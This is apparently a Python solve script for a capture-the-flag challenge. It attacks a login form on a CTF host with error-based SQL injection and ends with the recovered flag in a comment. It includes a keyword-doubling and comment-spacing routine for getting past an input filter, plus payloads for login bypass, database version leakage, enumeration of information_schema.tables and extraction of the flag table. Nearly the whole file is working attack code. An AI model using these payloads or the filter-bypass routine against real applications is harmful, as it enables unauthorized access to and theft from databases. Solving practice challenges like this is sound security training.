import requests
import re
import html

subs = {
    "'": "\\'",
    " ": "/**/",
    "union": "ununionion",
    "select": "selselectect",
    "where": "whwhereere",
    "and": "aandnd",
    "or": "oorr",
}

rgxs = {re.compile(re.escape(k), re.IGNORECASE): v for k, v in subs.items()}


def bypass(payload):
    for r, s in rgxs.items():
        payload = r.sub(s, payload)
    return payload


def login(u, p):
    r = requests.post(
        "http://h4ck3r.quest:10006/login", data={"username": u, "password": p}
    )
    t = r.text
    if len(t) < 100:
        return t
    g = (x for x in t.split("\n") if "<h2>" in x)
    return html.unescape(next(g))


# print(login(bypass("' or 1>0;#"),""))
# print(login(bypass("' union select extractvalue(rand(),concat(0x3a,version())),2,3;#"),""))
# u = bypass("' union select extractvalue(rand(),concat(0x3a, substring((select group_concat(concat(table_name,0x3a,table_schema,0x20)) from information_schema.tables),1,100) )),2,3;#")
u = bypass(
    "' union select extractvalue(rand(),concat(0x3a, substring((select * from `h3y_here_15_the_flag_y0u_w4nt,meow,flag`),1,100) )),2,3;#"
)
print(u)
print(login(u, ""))
u = bypass(
    "' union select extractvalue(rand(),concat(0x3a, substring((select * from `h3y_here_15_the_flag_y0u_w4nt,meow,flag`),32,100) )),2,3;#"
)
print(u)
print(login(u, ""))

# FLAG{!!!b00lean_bas3d_OR_err0r_based_sqli???}
